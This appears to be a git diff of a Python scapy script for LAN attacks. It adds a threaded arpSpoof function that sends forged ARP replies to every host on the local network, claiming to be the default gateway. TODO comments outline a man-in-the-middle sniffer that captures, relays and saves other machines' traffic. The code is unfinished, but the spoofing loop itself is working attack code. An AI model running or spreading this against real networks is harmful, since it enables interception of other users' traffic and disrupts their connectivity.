@@ -1,7 +1,7 @@
 
 try:
-    import wmi,logging,subprocess,re
-    from scapy.all import * #missing pcapy
+    import wmi,logging,subprocess,re, threading,time
+    from scapy.all import *
 except ImportError:
 
     #TODO: handle all cases of missing modules and try to solve
@@ -32,13 +32,22 @@ def getLocalAddrss():
     for i in localAddrss:
         ip=ipAddr.search(i)
         mac=macAddr.search(i)
-        localAddresses[ip.group()]=mac.group()
+        localAddresses[ip.group()]=mac.group().replace('-',':')#format MAC address for scapy
 
     #return dict of IP and MAC on LAN
     return localAddresses
 
-def arpSpoof(lanAddr):
-    pass
+def arpSpoof(localAddresses,defaultGateway,localMAC):
+    """
+    every 2 minutes send ARP broadcast to spoof all machines on LAN"""
+
+    #TODO: fix ARP spoofing
+    while True:
+        for ip in localAddresses.keys():
+            if ip != defaultGateway:
+                #create arp broadcast packet
+                a = Ether(dst=localAddresses[ip])/ARP(op='is-at', hwsrc='00:00:00:00:00:00',psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
+                sendp(a)
 
 
 def main():
@@ -60,19 +69,23 @@ def main():
     localAddresses=getLocalAddrss()
     logging.debug('created dictionary with all IP and MAC addresses on LAN')
 
+    arpThread=threading.Thread(target=arpSpoof,args=(localAddresses,defaultGateway,localMAC,))
+    arpThread.start()
+    logging.debug('created thread for ARP spoofing')
+
     while True: #main loop
 
-
-        #TODO: send ARP broadcast
+        #TODO:check if user wants to stop
         #TODO:listen for packets
         #TODO:save packet
         #TODO:send packet to router
         #TODO:listen to response from router
         #TODO:save response
         #TODO:send packet to original host
+        #TODO:save packets to file
         break
 
-    #TODO:save packets to file
+
 
 
 if __name__=='__main__':
